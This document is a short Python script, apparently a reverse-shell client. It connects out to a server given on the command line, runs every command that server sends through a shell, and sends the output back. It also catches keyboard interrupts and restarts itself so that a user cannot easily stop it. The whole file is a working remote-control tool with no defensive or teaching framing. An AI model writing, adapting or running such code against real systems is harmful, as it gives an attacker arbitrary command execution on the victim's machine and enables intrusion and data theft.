import socket
import sys
import subprocess
import os

host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' #server IP
port = int(sys.argv[2] if len (sys.argv) > 2 else 5555) # port we're tunneling data into

def foo(): 
	try: 
		#create socket object 
		client = socket.socket()
		client.connect((host,port)) #connect to server address
		data = client.recv(1024).decode()
		print('[STATUS] Server: ', data)

		#loop used as a shell
		while True:
			cmd = client.recv(1024).decode() #receive the command
			print(f'[STATUS] Receive: {cmd}')
		
			if cmd[:2] == 'cd': 
				os.chdir(cmd[3:]) #change directory command using os.chdir

			#allow user to quit
			quit = ['q', 'quit', 'x', 'exit']
			if cmd.lower() in quit:
				break
			try:
				#run the command
				result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) 
			except Exception as e:
				result = str(e).encode()

			#Send reassurance to the server that connection is still active if command has no output
			if len(result) == 0:
				#print 'No output when command does not output anything.'
				result = '[NO OUTPUT]'.encode()
		    #Send the output to the server
			client.send(result)

		client.close()
	except KeyboardInterrupt: # stops keyboard interrupt, buys us time to enter commands
		foo() 
foo() 

